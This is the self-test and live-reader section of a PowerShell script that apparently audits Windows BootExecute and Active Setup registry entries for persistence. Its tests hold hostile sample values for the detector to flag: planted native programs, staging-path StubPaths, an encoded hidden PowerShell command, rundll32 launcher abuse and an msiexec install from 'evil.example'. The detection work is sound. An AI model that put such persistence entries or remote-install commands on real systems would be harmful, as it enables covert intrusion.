    T 'the native image is System32\<name>.exe' ((Get-NativeImagePath 'autocheck evilnat /x' -SystemRoot 'C:\Windows') -eq 'C:\Windows\System32\evilnat.exe') (Get-NativeImagePath 'autocheck evilnat /x' -SystemRoot 'C:\Windows')
    T 'a \??\ path names the file itself' ((Get-NativeImagePath 'autocheck \??\C:\Users\Public\x.exe' -SystemRoot 'C:\Windows') -eq 'C:\Users\Public\x.exe') ''

    $rd = @{ BootExecute = @{ State = 'present'; Value = @('autocheck autochk *', 'autocheck evilnat'); Kind = 'MultiString'; Error = '' } }
    $b = Get-BootReport -Reads $rd -Probe $probe -KeyLabel 'SM' -SystemRoot $SR; $t = $b.Lines -join "`n"
    T 'an unsigned native program added beside autochk is CRITICAL, named with its image' ($b.Sev -eq 'CRITICAL' -and $b.Gap -eq 'OK' -and $t -match "(?m)^\[CRITICAL\] BootExecute entry 'autocheck evilnat' runs .*evilnat\.exe before Windows starts, as SYSTEM, and it is not validly signed") $t
    $b = Get-BootReport -Reads @{ BootExecute = @{ State = 'present'; Value = @('autocheck autochk *', 'autocheck \??\C:\Users\Public\x.exe'); Kind = 'MultiString' } } -Probe $probe -KeyLabel 'SM' -SystemRoot $SR
    T 'a native program in C:\Users\Public is CRITICAL from a staging path' ($b.Sev -eq 'CRITICAL' -and ($b.Lines -join ' ') -match 'staging path') ($b.Lines -join ' | ')
    $b = Get-BootReport -Reads @{ BootExecute = @{ State = 'present'; Value = @('autocheck autochk *', 'autocheck aswBoot.exe /A:"*" /L:"enu"'); Kind = 'MultiString' } } -Probe $probe -KeyLabel 'SM' -SystemRoot $SR
    T 'a validly signed antivirus boot-time scanner is a WARNING naming its signer' ($b.Sev -eq 'WARNING' -and ($b.Lines -join ' ') -match 'signed by Gen Digital Inc\.') ($b.Lines -join ' | ')
    $b = Get-BootReport -Reads @{ BootExecute = @{ State = 'present'; Value = @('autocheck autochk *', 'sdnative /boot'); Kind = 'MultiString' } } -Probe $probe -KeyLabel 'SM' -SystemRoot $SR
    T 'a Microsoft-signed System32 native program is INFO, named, not raised' ($b.Sev -eq 'OK' -and ($b.Lines -join ' ') -match '(?m)\[INFO\] BootExecute entry .sdnative /boot. runs .*sdnative\.exe, validly signed by Microsoft Windows') ($b.Lines -join ' | ')
    $b = Get-BootReport -Reads @{ BootExecute = @{ State = 'present'; Value = @('autocheck nohere'); Kind = 'MultiString' } } -Probe $probe -KeyLabel 'SM' -SystemRoot $SR
    T 'an image that is not on disk is a WARNING, never OK' ($b.Sev -eq 'WARNING' -and ($b.Lines -join ' ') -match 'not on disk') ($b.Lines -join ' | ')
    $b = Get-BootReport -Reads @{ BootExecute = @{ State = 'present'; Value = 'autocheck autochk *'; Kind = 'String' }; SetupExecute = @{ State = 'present'; Value = @('autocheck evilnat'); Kind = 'MultiString' } } -Probe $probe -KeyLabel 'SM' -SystemRoot $SR
    T 'a sibling value (SetupExecute) is graded by the same rule; a REG_SZ BootExecute is read' ($b.Sev -eq 'CRITICAL' -and ($b.Lines -join ' ') -match "SetupExecute entry 'autocheck evilnat'" -and ($b.Lines -join ' ') -match '\[OK\] BootExecute: autocheck autochk \*') ($b.Lines -join ' | ')
    $all = @{}; foreach ($n in $script:BootValues) { $all[$n] = @{ State = 'absent' } }
    $all.BootExecute = @{ State = 'present'; Value = @('autocheck autochk *', ''); Kind = 'MultiString' }
    $b = Get-BootReport -Reads $all -Probe $probe -KeyLabel 'SM' -SystemRoot $SR
    T 'the stock machine: autochk only, siblings absent, an empty string in the list -- the all-clear, nothing raised' ($b.Sev -eq 'OK' -and $b.Gap -eq 'OK' -and ($b.Lines -join "`n") -match "(?m)^\[OK\] BootExecute and its sibling values hold only Windows' own entries \(1 graded\)\.$") ($b.Lines -join ' | ')
    $b = Get-BootReport -Reads @{ BootExecute = @{ State = 'unreadable'; Error = 'SecurityException: Requested registry access is not allowed.' } } -Probe $probe -KeyLabel 'SM' -SystemRoot $SR
    T 'an unreadable Session Manager key is a raised gap, never the all-clear' ($b.Gap -eq 'WARNING' -and $b.Sev -eq 'OK' -and ($b.Lines -join ' ') -match 'BootExecute check NOT performed' -and ($b.Lines -join ' ') -notmatch '\[OK\]') ($b.Lines -join ' | ')
    $b = Get-BootReport -Reads @{ BootExecute = @{ State = 'nokey' } } -Probe $probe -KeyLabel 'SM' -SystemRoot $SR
    T 'a missing Session Manager key is a gap (every Windows has it)' ($b.Gap -eq 'WARNING' -and ($b.Lines -join ' ') -match 'NOT performed') ($b.Lines -join ' | ')
    $b = Get-BootReport -Reads @{ BootExecute = @{ State = 'absent' } } -Probe $probe -KeyLabel 'SM' -SystemRoot $SR
    T 'an absent BootExecute value is INFO, no gap, no finding' ($b.Gap -eq 'OK' -and $b.Sev -eq 'OK' -and ($b.Lines -join ' ') -match '\[INFO\] BootExecute value absent') ($b.Lines -join ' | ')

    # ---- Active Setup: Windows, Edge and Chrome StubPaths (benign twins, verbatim) ----
    $benign = @(
        @('C:\Windows\System32\ie4uinit.exe -UserConfig', 'ie4uinit.exe'),
        @('"C:\Windows\System32\rundll32.exe" "C:\Windows\System32\iesetup.dll",IEHardenAdmin', 'iesetup.dll'),
        @('"C:\Windows\System32\rundll32.exe" "C:\Windows\System32\iesetup.dll",IEHardenUser', 'iesetup.dll'),
        @('C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install', 'mscories.dll'),
        @('%SystemRoot%\system32\unregmp2.exe /FirstLogon', 'unregmp2.exe'),
        @('%SystemRoot%\system32\regsvr32.exe /s /n /i:/UserInstall %SystemRoot%\system32\themeui.dll', 'themeui.dll'),
        @('regsvr32.exe /s /n /i:U shell32.dll', 'shell32.dll'),
        @('"C:\Program Files\Windows Mail\WinMail.exe" OCInstallUserConfigOE', 'WinMail.exe'),
        @('"C:\Program Files (x86)\Microsoft\Edge\Application\131.0.2903.70\Installer\setup.exe" --configure-user-settings --verbose-logging --system-level --msedge --channel=stable', 'setup.exe'),
        @('"C:\Program Files\Google\Chrome\Application\131.0.6778.86\Installer\chrmstp.exe" --configure-user-settings --verbose-logging --system-level', 'chrmstp.exe'),
        @('C:\Windows\system32\cmd.exe /D /C start C:\Windows\system32\ie4uinit.exe -ClearIconCache', 'ie4uinit.exe'))
    foreach ($bn in $benign) {
        $tg = Get-StubTarget -Stub $bn[0] -Exists $noFile -SystemRoot $SR
        $v = Get-StubVerdict -Component 'c' -Stub $bn[0] -IsInstalled '1' -Target $tg -Facts (& $probe $tg.Target)
        T "Active Setup '$($bn[0])' is graded on $($bn[1]) and reads [OK]" ($v.Sev -eq 'OK' -and $v.Line -like '`[OK`]*' -and (Get-WinLeaf $tg.Target) -eq $bn[1]) ("$($tg.Kind) $($tg.Target) :: $($v.Line)")
    }
    function StubCase { param([string]$Stub, [string]$Inst = '1')
        $tg = Get-StubTarget -Stub $Stub -Exists $noFile -SystemRoot $SR
        $f = @{ State = 'signed'; CN = 'x'; Microsoft = $false }
        if ($tg.Target -and $tg.Target -notmatch $script:StagingRx -and ($tg.Kind -eq 'program' -or $tg.Kind -eq 'dllhost')) { $f = & $probe $tg.Target }
        return (Get-StubVerdict -Component 'dz' -Stub $Stub -IsInstalled $Inst -Target $tg -Facts $f)
    }
    $v = StubCase 'C:\Users\Public\update.exe'
    T 'a StubPath in C:\Users\Public is CRITICAL' ($v.Sev -eq 'CRITICAL' -and $v.Line -match '^\[CRITICAL\] Active Setup .dz. StubPath runs C:\\Users\\Public\\update\.exe from a staging path') $v.Line
    $v = StubCase 'rundll32.exe C:\Users\Public\x.dll,Run'
    T 'a rundll32 line is graded on the DLL it loads: a staged DLL is CRITICAL' ($v.Sev -eq 'CRITICAL' -and $v.Line -match 'x\.dll from a staging path') $v.Line
    $v = StubCase ('powershell.exe -w hidden -' + 'enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA')
    T 'encoded PowerShell in a StubPath is CRITICAL' ($v.Sev -eq 'CRITICAL' -and $v.Line -match 'attack-shaped command content') $v.Line
    $v = StubCase 'cmd.exe /c C:\ProgramData\Vendor\setup.cmd'
    T 'a script host in a StubPath is a WARNING showing the command' ($v.Sev -eq 'WARNING' -and $v.Line -match 'script host.*cmd\.exe /c C:\\ProgramData\\Vendor\\setup\.cmd') $v.Line
    $v = StubCase 'C:\ProgramData\Vendor\agent.exe /user'
    T 'an unsigned program is a WARNING' ($v.Sev -eq 'WARNING' -and $v.Line -match 'not validly signed \(NotSigned\)') $v.Line
    $v = StubCase '"C:\Program Files\Old\gone.exe" /x'
    T 'a target not on disk is INFO (stale), never OK and never raised' ($v.Sev -eq 'OK' -and $v.Line -match '^\[INFO\] .*not on disk') $v.Line
    $v = StubCase '"C:\Program Files\Vendor\locked.exe"'
    T 'a target whose file could not be read is a WARNING, never OK' ($v.Sev -eq 'WARNING' -and $v.Line -match 'could not be read') $v.Line
    $v = StubCase 'C:\Users\Public\update.exe' '0'
    T 'an entry switched off (IsInstalled=0) is INFO' ($v.Sev -eq 'OK' -and $v.Line -match '^\[INFO\] .*IsInstalled=0') $v.Line
    $v = StubCase 'C:\Windows\System32\rundll32.exe'
    T 'a DLL host with no DLL is a WARNING (nothing resolvable to grade)' ($v.Sev -eq 'WARNING' -and $v.Line -match 'names no file') $v.Line
    $tg = Get-StubTarget -Stub 'C:\Windows\System32\rundll32.exe C:\Program Files\Vendor\x y.dll,Entry' -Exists $noFile -SystemRoot $SR
    T 'an unquoted DLL path with spaces is resolved to the whole path' ($tg.Target -eq 'C:\Program Files\Vendor\x y.dll') $tg.Target

    # ---- review 2026-11-26: a signed host told to run something else ----
    foreach ($bad in @('rundll32.exe url.dll,FileProtocolHandler C:\ProgramData\x\evil.exe',
                       'rundll32.exe shell32.dll,ShellExec_RunDLL C:\ProgramData\x\evil.exe',
                       'msiexec.exe /q /i https://evil.example/x.msi')) {
        $v = StubCase $bad
        T "a Windows launcher handed another program is CRITICAL: $bad" ($v.Sev -eq 'CRITICAL') $v.Line
    }
    $v = StubCase ('"' + $SR + '\System32\rundll32.exe" "' + $SR + '\System32\shell32.dll",Control_RunDLL C:\Users\Public\evil.cpl')
    T 'the CI benign twin with a staged .cpl added is CRITICAL (the whole line is checked, not only the first DLL)' ($v.Sev -eq 'CRITICAL' -and $v.Line -match 'hands a file in a staging path') $v.Line
    $v = StubCase ('"' + $SR + '\System32\rundll32.exe" "' + $SR + '\System32\shell32.dll",Control_RunDLL C:\ProgramData\Vendor\x.cpl')
    T 'a DLL host handed a second file outside staging is a WARNING naming it' ($v.Sev -eq 'WARNING' -and $v.Line -match 'another file or path to open \(C:\\ProgramData\\Vendor\\x\.cpl\)') $v.Line
    $v = StubCase 'powershell.exe -NoProfile -File C:\Users\Public\x.ps1'
    T 'a staged script handed to powershell -File is CRITICAL, not the script-host WARNING' ($v.Sev -eq 'CRITICAL') $v.Line
    $v = StubCase 'C:\Windows\system32\cmd.exe /D /C start C:\ProgramData\x\evil.exe'
    T 'cmd /D /C start of a program outside System32 stays the script-host WARNING (the malign twin of the ClearIconCache entry)' ($v.Sev -eq 'WARNING' -and $v.Line -match 'script host') $v.Line
    $v = StubCase 'C:\Windows\system32\cmd.exe /D /C start C:\Windows\system32\ie4uinit.exe -ClearIconCache & C:\ProgramData\x\evil.exe'
    T 'the ClearIconCache shape with more cmd syntax stays the script-host WARNING' ($v.Sev -eq 'WARNING' -and $v.Line -match 'script host') $v.Line
    $v = StubCase 'C:\Windows\system32\cmd.exe /D /C start C:\Windows\system32\agent.exe'
    T 'cmd /D /C start of an unsigned System32 program is graded on that program' ($v.Sev -eq 'WARNING' -and $v.Line -match 'agent\.exe.*not validly signed') $v.Line
    $v = StubCase 'nohere.exe /s'
    T 'a program named without a folder and not in System32 is a WARNING (Windows also searches its own folder and PATH), never stale' ($v.Sev -eq 'WARNING' -and $v.Line -match 'without its folder') $v.Line
    $v = StubCase 'C:\ProgramData\Vendor\gone.exe'
    T 'a missing target in a folder outside Windows and Program Files is a WARNING (pre-staged), never stale' ($v.Sev -eq 'WARNING' -and $v.Line -match 'a file placed there later runs') $v.Line
    $v = StubCase 'C:\Users\Public\update.exe' 'String:0'
    T 'a non-DWORD IsInstalled of 0 is graded as installed (here CRITICAL), never read as switched off' ($v.Sev -eq 'CRITICAL') $v.Line
    T 'a \SystemRoot\ native path resolves under the Windows folder' ((Get-NativeImagePath 'autocheck \SystemRoot\System32\evilnat.exe' -SystemRoot 'C:\Windows') -eq 'C:\Windows\System32\evilnat.exe') (Get-NativeImagePath 'autocheck \SystemRoot\System32\evilnat.exe' -SystemRoot 'C:\Windows')

    $roots = @(
        @{ Root = 'R1'; Required = $true; State = 'ok'; Unread = @('{BAD}'); Entries = @(@{ Key = '{A}'; Name = 'Windows Mail'; Stub = '"C:\Program Files\Windows Mail\WinMail.exe" OCInstallUserConfigOE'; IsInstalled = '1' }, @{ Key = '{B}'; Name = ''; Stub = ''; IsInstalled = '1' }) },
        @{ Root = 'R2'; Required = $false; State = 'nokey' })
    $a = Get-ActiveSetupReport -Roots $roots -Probe $probe -Exists $noFile -SystemRoot $SR; $t = $a.Lines -join "`n"
    T 'an unreadable component is a raised gap naming it; an optional root that is absent is not' ($a.Gap -eq 'WARNING' -and $a.Sev -eq 'OK' -and $t -match '1 component\(s\) under R1 that could not be read: \{BAD\}' -and $t -notmatch 'R2' -and $t -notmatch 'none suspicious') $t
    $a = Get-ActiveSetupReport -Roots @(@{ Root = 'R1'; Required = $true; State = 'nokey' }) -Probe $probe -Exists $noFile -SystemRoot $SR
    T 'a missing native Installed Components key is a gap' ($a.Gap -eq 'WARNING' -and ($a.Lines -join ' ') -match 'NOT performed') ($a.Lines -join ' | ')
    $a = Get-ActiveSetupReport -Roots @(@{ Root = 'R1'; Required = $true; State = 'unreadable'; Error = 'denied' }) -Probe $probe -Exists $noFile -SystemRoot $SR
    T 'an unreadable Installed Components key is a gap, never the all-clear' ($a.Gap -eq 'WARNING' -and ($a.Lines -join ' ') -notmatch '\[OK\]') ($a.Lines -join ' | ')
    $a = Get-ActiveSetupReport -Roots @(@{ Root = 'R1'; Required = $true; State = 'ok'; Unread = @(); Entries = @(@{ Key = '{A}'; Name = 'Windows Mail'; Stub = '"C:\Program Files\Windows Mail\WinMail.exe" OCInstallUserConfigOE'; IsInstalled = '1' }, @{ Key = '{E}'; Name = ''; Stub = 'C:\Users\Public\update.exe'; IsInstalled = '1' }) }) -Probe $probe -Exists $noFile -SystemRoot $SR
    T 'a planted entry beside a benign one: CRITICAL, one hit, no all-clear' ($a.Sev -eq 'CRITICAL' -and @($a.Hits).Count -eq 1 -and ($a.Lines -join ' ') -notmatch 'none suspicious') ($a.Lines -join ' | ')

    $env:SystemRoot = $savedSR
    if ($fails) { Write-Output "[FAIL] $fails boot_activesetup_check self-test expectation(s) unmet"; exit 1 }
    Write-Output "[OK] boot_activesetup_check self-test: Windows' own BootExecute and Active Setup entries read clean, planted ones are graded on their image, and an unread key is a gap."
    exit 0
}

# ---- live readers --------------------------------------------------------

# Facts about one file: signed|unsigned|unverified|absent|unread. Absent only
# when the parent answers without it (Test-AbsentForSure).
function Get-ImageFacts {
    param([string]$Path)
    try { $null = Get-Item -LiteralPath $Path -Force -ErrorAction Stop }
    catch {
        if (Test-AbsentForSure $Path) { return @{ State = 'absent' } }
        return @{ State = 'unread'; Why = (Get-OneLine $_.Exception.Message) }
    }
    $sig = $null
    try { $sig = Get-AuthenticodeSignature -LiteralPath $Path -ErrorAction Stop }
    catch { return @{ State = 'unverified'; Why = (Get-OneLine $_.Exception.Message) } }
    if ($sig.Status -ne 'Valid' -or -not $sig.SignerCertificate) { return @{ State = 'unsigned'; Status = [string]$sig.Status } }
    $subj = [string]$sig.SignerCertificate.Subject
    $cn = $subj
    if ($subj -match '(?:^|,\s*)CN=(.+?)(?:,\s*[A-Za-z]+=|$)') { $cn = $Matches[1].Trim().Trim('"') }
    return @{ State = 'signed'; CN = $cn; Microsoft = ($cn -match '^Microsoft\b') }
}

# One Installed Components root, through .NET so a component name is never a
# wildcard and one restricted component does not lose the rest.
function Read-ActiveSetupRoot {
    param([string]$Root, [bool]$Required)
    $out = @{ Root = $Root; Required = $Required; State = 'ok'; Error = ''; Unread = @(); Entries = @() }
    $k = $null
    if ($Root -match '^(?i)HKLM:\\(.+)$') {
        # Through the 64-bit view on a 64-bit Windows: a 32-bit PowerShell
        # would otherwise be redirected to WOW6432Node and read that twice,
        # never the native key, and still print the all-clear.
        $rel = $Matches[1]
        $view = if ([Environment]::Is64BitOperatingSystem) { [Microsoft.Win32.RegistryView]::Registry64 } else { [Microsoft.Win32.RegistryView]::Default }
        try {
            $base = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $view)
            $k = $base.OpenSubKey($rel, $false)
        } catch { $out.State = 'unreadable'; $out.Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message); return $out }
        if ($null -eq $k) { $out.State = 'nokey'; return $out }
    } else {
        try { $k = Get-Item -LiteralPath $Root -ErrorAction Stop }
        catch {
            if ($_.Exception -is [System.Management.Automation.ItemNotFoundException]) { $out.State = 'nokey'; return $out }
            $out.State = 'unreadable'; $out.Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message); return $out
        }
    }
    $names = @()
    try { $names = @($k.GetSubKeyNames()) }
    catch { $out.State = 'unreadable'; $out.Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message); return $out }
    $unread = New-Object System.Collections.Generic.List[string]
    $ents = New-Object System.Collections.Generic.List[object]
    foreach ($n in $names) {
        $sk = $null
        try {
            $sk = $k.OpenSubKey($n, $false)
            if ($null -eq $sk) { continue }
            $stub = $sk.GetValue('StubPath', $null)
            $inst = $sk.GetValue('IsInstalled', $null)
            $disp = $sk.GetValue('', $null)
            # Only a DWORD 0 is "switched off": Windows' own entries store
            # IsInstalled as a DWORD. Any other type is graded as installed, and named,
            # so a REG_SZ "0" cannot read as off while Windows runs it.
            $iv = ''
            if ($null -ne $inst) {
                $ik = [string]$sk.GetValueKind('IsInstalled')
                $iv = if ($ik -eq 'DWord') { [string]$inst } else { "${ik}:" + (@($inst) -join ' ') }
            }
            $ents.Add(@{ Key = $n; Name = (Get-OneLine ([string]$disp)); Stub = [string]$stub; IsInstalled = $iv })
        } catch { $unread.Add($n) }
        finally { if ($sk) { $sk.Close() } }
    }
    $k.Close()
    $out.Unread = @($unread.ToArray()); $out.Entries = @($ents.ToArray())
    return $out
}

$probeLive = { param([string]$p) Get-ImageFacts $p }
$sysRoot = $env:SystemRoot

# ---- 1. BootExecute and siblings (T1547.001) -----------------------------
'--- [T1547.001] BootExecute: native programs Session Manager runs before Windows starts ---'
$smKey = if ($CiSessionKey) { $CiSessionKey } else { 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager' }
$reads = @{}
foreach ($v in $script:BootValues) { $reads[$v] = Read-RegValueState -KeyPath $smKey -Name $v }
$boot = Get-BootReport -Reads $reads -Probe $probeLive -KeyLabel $smKey -SystemRoot $sysRoot
$boot.Lines
if ($boot.Sev -ne 'OK') {
    Write-WhenCaveat
    foreach ($h in @($boot.Hits)) { $w = Get-WhenLine -KeyPath $smKey -FilePath $h; if ($w) { "  $h" + $w.Substring(1) } }
}
Write-Marker -Name 'bootexec' -Sev $boot.Sev
if ($boot.Gap -ne 'OK') { Write-Marker -Name 'bootexec_gap' -Sev $boot.Gap }

# ---- 2. Active Setup (T1547.014) -----------------------------------------
''
"--- [T1547.014] Active Setup: StubPath commands run at each user's next sign-in ---"
$asRoots = @()
if ($CiActiveSetupRoots.Count) {
    $first = $true
    foreach ($r in $CiActiveSetupRoots) { $asRoots += ,(Read-ActiveSetupRoot -Root $r -Required $first); $first = $false }
} else {
    $asRoots += ,(Read-ActiveSetupRoot -Root 'HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components' -Required $true)
    $asRoots += ,(Read-ActiveSetupRoot -Root 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Active Setup\Installed Components' -Required $false)
}
$as = Get-ActiveSetupReport -Roots $asRoots -Probe $probeLive -SystemRoot $sysRoot
$as.Lines
if ($as.Sev -ne 'OK') {
    Write-WhenCaveat
    foreach ($h in @($as.Hits)) { $w = Get-WhenLine -KeyPath $h.Key -FilePath $h.File; if ($w) { "  $($h.Key)" + $w.Substring(1) } }
}
Write-Marker -Name 'activesetup' -Sev $as.Sev
if ($as.Gap -ne 'OK') { Write-Marker -Name 'activesetup_gap' -Sev $as.Gap }
# Written last: the caller raises "produced no verdict" when it is absent.
Write-Marker -Name 'bootas_done' -Sev 'done'
